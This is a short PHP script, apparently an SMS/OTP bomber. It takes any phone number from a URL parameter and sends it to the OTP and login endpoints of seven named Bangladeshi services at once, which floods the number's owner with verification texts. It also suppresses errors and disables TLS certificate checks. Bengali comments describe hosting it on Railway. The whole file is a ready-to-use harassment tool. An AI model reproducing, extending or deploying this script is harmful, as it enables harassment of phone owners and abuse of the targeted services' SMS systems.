<?php
// রেলওয়েতে কোনো পারমিশন এরর যেন না হয়
error_reporting(0);
header('Content-Type: application/json');

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    die(json_encode(["status" => "error", "message" => "Phone number missing"]));
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;

// সিম্পল রিকোয়েস্ট ফাংশন
function call($url, $post = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }
    
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

// লুপ ছাড়াই সব সার্ভিস একসাথে কল হচ্ছে (সার্ভার ক্র্যাশ রোধে)
$data = [
    "pbs" => call('https://apialpha.pbs.com.bd/api/OTP/generateOTP', ["userPhone" => $phone_11]),
    "shikho" => call('https://api.shikho.com/auth/v2/send/sms', ["phone" => "88".$phone_11, "type" => "student"]),
    "iqra" => call("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11),
    "truck" => call('https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo', ["userType" => "shipper", "phoneNo" => $phone_11]),
    "bdtickets" => call('https://api.bdtickets.com:20100/v1/auth', ["createUserCheck"=>true,"phoneNumber"=>"88".$phone_11,"applicationChannel"=>"WEB_APP"]),
    "bikroy" => call("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11"),
    "redx" => call('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', ["phoneNumber" => $phone_11])
];

echo json_encode($data, JSON_PRETTY_PRINT);
?>
